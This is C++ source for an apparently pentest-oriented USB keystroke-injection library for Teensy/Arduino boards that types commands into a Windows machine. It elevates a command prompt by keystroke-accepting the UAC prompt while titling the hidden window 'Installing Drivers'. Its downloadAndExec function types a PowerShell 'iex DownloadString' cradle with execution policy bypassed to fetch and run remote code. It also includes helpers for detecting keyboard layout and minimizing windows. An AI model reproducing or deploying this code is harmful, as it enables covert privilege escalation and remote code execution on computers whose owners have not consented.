#include "pentesy.h"
#include "WProgram.h"

const int ledPin = 11;

int ledKeys()         {return int(keyboard_leds);}
bool isOnNumLock()    {return ((ledKeys() & 1) == 1) ? true : false;}
bool isOnCapsLock()   {return ((ledKeys() & 2) == 2) ? true : false;}

void closeError(void)     {pushAndPopKey(MODIFIERKEY_ALT, KEY_F4, 200);} // CTRL+F4

void changeLanguage(void) {pushAndPopKey(MODIFIERKEY_ALT | MODIFIERKEY_SHIFT, 0, 300);} // ALT+SHIFT

void minimizeWindows(bool minimize)
{
    if (minimize) {
        pushAndPopKey(MODIFIERKEY_LEFT_GUI, KEY_M, 400);
    }
    else {
        pushAndPopKey(MODIFIERKEY_LEFT_GUI | MODIFIERKEY_SHIFT, KEY_M, 400); // Press WIN+M and WIN+SHIFT+M
    }
}


bool isEngInput()
{
    Keyboard.println("echo WScript.CreateObject(\"WScript.Shell\").SendKeys \"{NUMLOCK}\" > %temp%\\yw0.vbs && wscript %temp%\\yw0.vbs");
    delay(500);
    return isOnNumLock();
}


void popKey(int sleep = 0)
{
    delay(200);
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(sleep);
}


void pushAndPopKey(uint8_t key_mod = 0, uint8_t key = 0, int sleep = 0)
{
    Keyboard.set_modifier(key_mod);
    Keyboard.send_now();
    Keyboard.set_key1(key);
    Keyboard.send_now();
    popKey(sleep);
}


void raisingPrivileges()
{
    pushAndPopKey(MODIFIERKEY_LEFT_GUI, 0, 500); // WIN
    Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=18 LINES=1 && title Installing Drivers\"");
    delay(800);
    pushAndPopKey(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT, KEY_ENTER, 2000); // Right CTRL+SHIFT+ENTER
    pushAndPopKey(0, KEY_LEFT, 200); // Press Left
    pushAndPopKey(0, KEY_ENTER, 600); // Press Enter
}


void downloadAndExec(String url)
{
    Keyboard.print("powershell -ExecutionPolicy Bypass -noLogo -c \"iex (New-Object Net.WebClient).DownloadString('");
    Keyboard.print(url);
    Keyboard.println("')\"");
    delay(500);
    Keyboard.println("exit");
    ledBlink(2,200);
}


void ledBlink(int quantity, int time)
{
    for(int i=0; i<quantity; i++)
    {
        delay(time);
        digitalWrite(ledPin, HIGH);
        delay(time);
        digitalWrite(ledPin, LOW);
    }
}
